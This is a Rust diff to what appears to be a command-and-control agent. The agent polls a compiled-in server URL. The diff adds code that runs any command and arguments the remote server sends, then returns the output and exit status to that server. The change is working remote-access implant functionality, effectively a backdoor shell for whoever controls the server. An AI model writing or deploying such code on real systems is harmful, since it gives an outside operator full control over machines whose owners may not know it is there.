@@ -3,9 +3,11 @@ pub mod network;
 pub mod state;
 
 use state::State;
+use std::process::Output;
 use std::sync::Arc;
 use talaria::helper::*;
 use talaria::protocol::*;
+use tokio::process::Command;
 use tokio::sync::RwLock;
 use tokio::time::{self, Duration};
 const URL: &'static str = env!("URL", "environment variable `URL` not defined");
@@ -75,10 +77,48 @@ async fn eval(state: Arc<RwLock<State>>) {
         let instruction = match state.write().await.get_pending_instruction() {
             Some(instruction) => instruction,
             None => continue,
-        };
+        }
+        .clone();
+
+        devlog!("Evaluating instruction: {:#?}", instruction);
 
         match instruction {
-            _ => devlog!("Evaluating instruction: {:#?}", instruction),
+            // provisional as to not break #main branch
+            // FIXME: replace this in the migration to Rhai
+            AgentInstructionBody::Command {
+                ref command,
+                ref command_id,
+                ref args,
+            } => {
+                devlog!(
+                    "Executing Command: {:?}, ID: {:?}, Args: {:?}",
+                    command,
+                    command_id,
+                    args
+                );
+
+                // Execute the received command with arguments
+                let output: Output = Command::new(command).args(args).output().await.unwrap();
+
+                // Capture stdout, stderr, and status code
+                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+                let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
+
+                // Print the output for debugging
+                devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);
+
+                let response_body = AgentResponseBody::CommandResponse {
+                    command: command.to_string(),
+                    command_id: *command_id,
+                    status_code,
+                    stdout,
+                    stderr,
+                };
+
+                state.write().await.push_response(response_body);
+            }
+            _ => {}
         }
     }
 }
